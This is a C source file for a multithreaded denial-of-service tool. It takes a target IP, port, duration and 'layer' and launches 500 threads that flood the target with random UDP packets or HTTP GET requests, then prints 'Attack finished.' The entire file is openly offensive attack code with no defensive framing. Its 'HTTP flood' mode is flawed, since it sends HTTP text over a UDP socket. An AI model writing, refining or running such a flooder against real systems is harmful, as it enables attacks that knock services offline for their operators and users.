#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

#define NUM_THREADS 500
#define PACKET_SIZE 2048
#define MIN_BURST 100
#define MAX_BURST 1000

struct thread_data {
    char *ip;
    int port;
    int duration;
    int layer;
};

// Function to generate a real-time payload with random characters
void generate_payload(char *buffer, size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < size - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size - 1] = '\0';
}

// UDP Flood Attack (Layer 4)
void *udp_flood(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &target.sin_addr);

    char buffer[PACKET_SIZE];
    int burst = MIN_BURST + (rand() % (MAX_BURST - MIN_BURST));
    time_t start_time = time(NULL);

    while (time(NULL) - start_time < data->duration) {
        generate_payload(buffer, PACKET_SIZE); // Generate a random payload in real time
        for (int i = 0; i < burst; i++) {
            sendto(sock, buffer, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// HTTP Flood Attack (Layer 7)
void *http_flood(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &target.sin_addr);

    char buffer[PACKET_SIZE];
    time_t start_time = time(NULL);
    int burst = MIN_BURST + (rand() % (MAX_BURST - MIN_BURST));

    while (time(NULL) - start_time < data->duration) {
        snprintf(buffer, PACKET_SIZE, "GET /%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Linux; Android 10)\r\nConnection: Keep-Alive\r\n\r\n", rand(), data->ip);
        for (int i = 0; i < burst; i++) {
            sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&target, sizeof(target));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <ip> <port> <duration> <layer>\n", argv[0]);
        return 1;
    }

    srand(time(NULL)); // Seed the random generator

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int layer = atoi(argv[4]);

    pthread_t threads[NUM_THREADS];
    struct thread_data data;

    data.ip = ip;
    data.port = port;
    data.duration = duration;
    data.layer = layer;

    for (int i = 0; i < NUM_THREADS; i++) {
        if (layer == 4) {
            pthread_create(&threads[i], NULL, udp_flood, (void *)&data);
        } else if (layer == 7) {
            pthread_create(&threads[i], NULL, http_flood, (void *)&data);
        }
    }

    sleep(duration); // Keep the process alive while threads execute

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}